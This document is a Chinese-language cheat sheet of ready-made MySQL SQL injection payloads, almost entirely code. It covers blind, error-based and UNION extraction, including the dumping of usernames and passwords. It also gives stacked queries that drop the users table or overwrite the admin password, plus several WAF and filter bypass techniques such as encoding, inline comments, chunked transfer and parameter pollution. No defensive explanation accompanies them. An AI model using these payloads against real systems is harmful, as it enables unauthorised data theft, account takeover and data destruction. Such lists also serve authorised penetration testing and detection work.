# MySQL SQL 注入 Payload 模板

## 基础注入检测

### 布尔盲注

```sql
' AND 1=1--
' AND 1=2--
" AND 1=1--
" AND 1=2--
') AND 1=1--
') AND 1=2--
')) AND 1=1--
')) AND 1=2--
```

### 时间盲注

```sql
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--
' IF(1=1,SLEEP(5),0)--
" AND SLEEP(5)--
') AND SLEEP(5)--
```

### 报错注入

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```

## 数据提取

### UNION 注入

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 堆叠查询

```sql
'; DROP TABLE users--
'; INSERT INTO users(username,password) VALUES('hacker','hacked')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

## 绕过技术

### 注释绕过

```sql
'/**/AND/**/1=1--
'/*!50000AND*/1=1--
'%0aAND%0a1=1--
'--%0a--
```

### 大小写混合

```sql
' AnD 1=1--
' uNiOn SeLeCt 1,2,3--
' UnIoN AlL SeLeCt 1,2,3--
```

### 编码绕过

```sql
# URL 编码
%27%20AND%201%3D1--

# 双重 URL 编码
%2527%2520AND%25201%253D1--

# 十六进制编码
' AND 1=CONCAT(0x74657374)--

# CHAR 编码
' AND 1=CHAR(116,101,115,116)--
```

### 函数替代

```sql
# concat -> concat_ws
' UNION SELECT concat_ws(0x7e,username,password) FROM users--

# sleep -> benchmark
' AND BENCHMARK(5000000,SHA1('test'))--

# substr -> mid / left / right
' AND MID(version(),1,1)='5'--
' AND LEFT(version(),1)='5'--
```

## 特殊场景

### ORDER BY 注入

```sql
' ORDER BY 1--
' ORDER BY 999--
' ORDER BY IF(1=1,1,SLEEP(5))--
' ORDER BY CASE WHEN (1=1) THEN 1 ELSE SLEEP(5) END--
```

### LIMIT 注入

```sql
' LIMIT 0,1 UNION SELECT 1,2,3--
' LIMIT 0,1 PROCEDURE ANALYSE()--
```

### INSERT 注入

```sql
' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
', (SELECT * FROM (SELECT(SLEEP(5)))a))--
```

### UPDATE 注入

```sql
' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
', password=(SELECT password FROM users WHERE username='admin') WHERE username='hacker'--
```

## WAF 绕过

### 分块传输

```
POST /api HTTP/1.1
Transfer-Encoding: chunked

3
'id
3
=1'
0
```

### HTTP 参数污染

```
?id=1&id=' OR 1=1--
```

### 内联注释

```sql
'/*!50000OR*/1=1--
'/*!50000UNION*//*!50000SELECT*/1,2,3--
```